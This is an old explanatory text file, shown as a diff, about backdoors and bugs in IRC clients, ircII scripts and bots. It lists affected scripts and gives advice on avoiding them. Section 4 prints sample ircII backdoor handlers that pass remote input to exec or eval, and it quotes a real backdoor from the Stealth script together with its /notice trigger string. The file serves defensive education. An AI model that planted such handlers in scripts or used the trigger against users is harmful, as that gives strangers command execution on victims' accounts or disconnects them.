@@ -1,0 +1,439 @@
+          Bugs and Backdoors in IRC clients, scripts and bots
+
+          ---------------------------------------------------
+
+
+
+
+
+1. What is a backdoor?
+
+----------------------
+
+
+
+A backdoor is a feature of a program that can be used to make it act in
+
+some way that the person who is running it did not intend.
+
+
+
+Among IRC-related programs, bots, clients and scripts can have
+
+backdoors.
+
+
+
+An important point to note is that some backdoors are intentional and
+
+some are not; with ircII scripts specifically, the problem is that
+
+ircII is not a very clear programming language when it comes to
+
+evaluation, and neither is sh/csh (used in all the /EXECs), and it's
+
+easy for someone who doesn't really understand what he's doing to put
+
+unwanted backdoors. In clients and bots, which are usually written in
+
+C, the bugs or backdoors tend to be harder to find and exploit.
+
+
+
+The line between an unintended backdoor and a bug is rather thin, I'd
+
+call it a backdoor if it can be used to make the bot do somethign
+
+specific, and just a bug if it can be used only to make the client or
+
+bot disconnect (ping timeout, or excess flood).
+
+
+
+
+
+2. How dangerous can a backdoor be?
+
+-----------------------------------
+
+
+
+A backdoor can be more or less ``powerful'', according to how much
+
+access to your client's features and/or account it gives to an intruder.
+
+
+
+In the worst cases, a backdoor will let an intruder execute arbitrary
+
+commands on the machine your client or bot is running, allowing full
+
+access to your account. This can in turn allow an intruder to compromise
+
+your whole system's security, by cracking passwords or otherwise. They
+
+can also make you send mail, post to Usenet, etc. I will call this
+
+giving Unix access.
+
+
+
+In other cases, the backdoor will let the intruder control your IRC
+
+client, making it do all IRC-related things like joining channels,
+
+speaking in them, or signing off, or /killing if you're an IRCop. I will
+
+call this giving IRC access.
+
+
+
+And in some cases, the backdoor will only let them do some specific
+
+things. The most common case is when the backdoor only lets an intruder
+
+disconnect you from IRC.
+
+
+
+Typically, unintended backdoors and bugs will either give full Unix and
+
+IRC access, or just let anyone kill the client.
+
+
+
+
+
+3. What known scripts, clients and bots have backdoors?
+
+-------------------------------------------------------
+
+
+
+Off the top of my head (I've *SEEN* all of these, and some of them I've
+
+found myself) :
+
+
+
+  * iNFiNiTY, toolZ, UltBox (and probably other related scripts) have a
+
+    backdoor (very likely unintended) that gives full Unix access to
+
+    anyone.
+
+
+
+  * early versions of GargOyle have an intended backdoor (supposedly
+
+    stolen from some other script) that gives Unix and IRC access to
+
+    anyone.
+
+
+
+  * some versions of PhoEniX have an unintended backdoor that let people
+
+    make you signoff
+
+
+
+  * Pillow Fighter II has an intended backdoor that gives Unix and IRC
+
+    access to anyone.
+
+
+
+  * Stealth has at least 2 intended backdoors, one of which gives
+
+    Unix and IRC access to anyone, and the other one that lets people
+
+    make you signoff.
+
+
+
+  * Some (old) versions of Axis have a backdoor that give on specific
+
+    person Unix and IRC access, and another one that makes you give him
+
+    ops. Recent versions supposedly don't have it; I haven't checked
+
+    them.
+
+
+
+  * Some (hacked?) versions of the VeVeS script have an intended
+
+    backdoor that gives Unix and IRC access to anyone.
+
+
+
+  * IrcOP.irc is a trojan horse script (i.e. it does NOTHING useful for
+
+    you) which removes all your files, opens your account to anyone,
+
+    and makes you do obnoxious stuff on IRC.
+
+
+
+  * Some (hacked?) versions of the ComBot bot have an intended backdoor
+
+    that gives IRC access to anyone.
+
+
+
+  * eggdrop bots, if improperly configured, can give Unix access to
+
+    to anyone with bot-master privileges.
+
+
+
+  * All VladBots, ComBot, HackBots, Kn1ghtBots, DweebBots, StelBots and
+
+    similar bots can be killed (segmentation fault, bus error, or ping
+
+    timeout, according to specific details), with more or less
+
+    difficulty (and without flooding them).
+
+
+
+  * Some hacked old version of ircII 2.2.9 have a backdoor that gives
+
+    anyone Unix and IRC access. This one was the object of a CERT
+
+    advisory.
+
+
+
+  * Old versions of ircII (prior to 2.3.x-beta) have a bug in the
+
+    filtering of escape sequences that lets anyone with ops on a
+
+    channel where you are to mess up your screen.
+
+
+
+  * Old versions of ircII (prior to 2.6) have a bug in DCC handling
+
+    that lets someone make you ping timeout once you have a DCC
+
+    connection with them.
+
+
+
+This is by no means a comprehensive list; there are tons of scripts out
+
+there and I don't spend my time skimming them all. In particular I've
+
+never looked closely at TextBox or LiCe, and I know of no-one who has,
+
+so I wouldn't trust them either.
+
+
+
+
+
+4. How does a backdoor work?
+
+----------------------------
+
+
+
+In ircII, backdoors are typically /on statements like these:
+
+
+
+#1  -   /on ^ctcp "% % BACKDOOR *" $3-
+
+#2  -   /on ^notice "% BACKDOOR *" $2-
+
+#3  -   /on ^ctcp "% % BACKDOOR *" quote $3-
+
+#4  -   /on ^ctcp "% % DCC SEND % *" exec -name stuff ls $5
+
+#5  -   /on -notice "% STUFF*" eval ^assign blah $3-
+
+
+
+#1 and #2 are obviously intended, and give anyone IRC and Unix
+
+(by sending EXEC commands) access.
+
+
+
+#3 is obviously intended too, and gives IRC access only.
+
+
+
+#4 looks like an unintended bug, but still gives full Unix access
+
+to anyone (beware, this can be made safe by $strip()ing lots of
+
+characters, but is a potentially dangerous thing to do. Did *you*
+
+know that ^ is interpreted like | by SunOS /bin/sh's?).
+
+
+
+With #5, the problem is the eval, but once again, since ircII lets
+
+you execute the contents of variables without an eval, looking for
+
+all the evals and all the /on's and all the /exec's is *not* a safe
+
+way to be sure a script is backdoor-free.
+
+
+
+
+
+Finally, a real example of a backdoor, for the most skeptical; this
+
+is taken straight out of the Stealth script:
+
+
+
+alias qwrrw {
+
+   /echo [^BFate^B] You have been killed
+
+   /signoff I'm a dork, and I am sorry for disturbing you all.  I'll leave now}
+
+
+
+on ^notice "% 53764^B^B856324^B^B32fd563gf^Vds5rx^B^Bfdtsr5ss54" {/qwrrw}
+
+
+
+So if someone is running Stealth, all you have to do is
+
+/notice nickname 53764^B^B856324^B^B32fd563gf^Vds5rx^B^Bfdtsr5ss54
+
+and they signoff.
+
+
+
+And I'd like to see anyone arguing that this was not intended...
+
+
+
+
+
+5. How can I avoid backdoors?
+
+-----------------------------
+
+
+
+It all comes to a simple fact: IRC is full of people who cannot be
+
+trusted, and running (/load'ing) a script (or a bot) that someone sent
+
+you is akin to putting a *lot* of trust in this person, *AND* in all the
+
+people who have had this script between the original author and whoever
+
+sent it to you. You don't only need to trust that the person doesn't
+
+mean to harm you, but also that the person can *check* and make sure
+
+that they aren't going to.
+
+
+
+War scripts like Serpent and Phoenix and TextBox and LiCe are the least
+
+trustable for a number of reasons:
+
+
+
+  * Someone who writes a script (or puts his name at the top of a bunch
+
+    of stolen routines) that can be disruptive to the net is obviously
+
+    not someone who is interested in doing people a favor. Trusting
+
+    their code is really the thing not to do.
+
+
+
+  * These scripts tend to be *very* big (200k is no uncommon...) and
+
+    thus are a pain to check. I have looked at some in enough detail
+
+    to find backdoors, but you need to look a *lot* more carefully
+
+    to be able to say that there are none left. Definitely not for
+
+    the casual user.
+
+
+
+  * They are often distributed from one to another, instead of getting
+
+    them from some "official" place. This means that any one with a
+
+    minimum knowledge of ircII scripting can add 2 lines in the middle
+
+    of Phoenix, increase the version number, and send it around.
+
+
+
+
+
+The scripts *I* would personally trust:
+
+
+
+  zer0     -  I've written it myself, so I know there are no backdoors,
+
+
+      I'm reasonably sure there are no exploitable bugs, and
+
+
+      it's small enough for anyone to check in a reasonable
+
+
+      time.
+
+
+      You can get it from
+
+
+      http://www.eleves.ens.fr:8080/home/espel/index.html.
+
+
+
+  Deturbo  -  Written by DeadelviS.
+
+
+
+  SuperPak -  Written by TG; get version 3.2, *not* Barron's version
+
+
+      (numbered 5.4).
+
+
+
+All of these can be found in ftp://isr0954.urh.uiuc.edu/pub/irc/scripts
+
+
+
+
+
+------------------------------------------------------------------------
+
+
+
+You can send any additional comments to:
+
+
+
+   orabidoo <roger.espel.llima@ens.fr>
+
+
+
+
+
+
